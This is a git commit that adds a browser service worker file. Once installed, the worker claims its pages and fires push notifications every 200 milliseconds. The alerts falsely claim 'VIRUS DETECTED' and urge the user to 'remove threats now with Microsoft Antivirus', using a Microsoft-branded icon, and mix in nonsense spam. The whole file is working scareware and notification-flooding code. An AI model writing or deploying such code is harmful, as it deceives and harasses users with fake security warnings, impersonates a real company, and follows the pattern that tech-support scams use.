af312ebbc0b63b62701404f3dfb4c706ee40e780
Tiago Rangel <70700766+tiagorangel1@users.noreply.github.com>
2025-02-09 18:16:36 +0000

    first commit

---
+++ sw.js
@@ -0,0 +1,16 @@
+self.addEventListener("install", () => self.skipWaiting());
+
+self.addEventListener("activate", (event) => {
+  event.waitUntil(self.clients.claim());
+});
+
+setInterval(() => {
+  self.registration.showNotification("Remove Threats Now!", {
+    body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
+    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
+  });
+  self.registration.showNotification("Make your phone happy.", {
+    body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT. MAKE PHONE HAPPY NOW.",
+    icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
+  });
+}, 200);
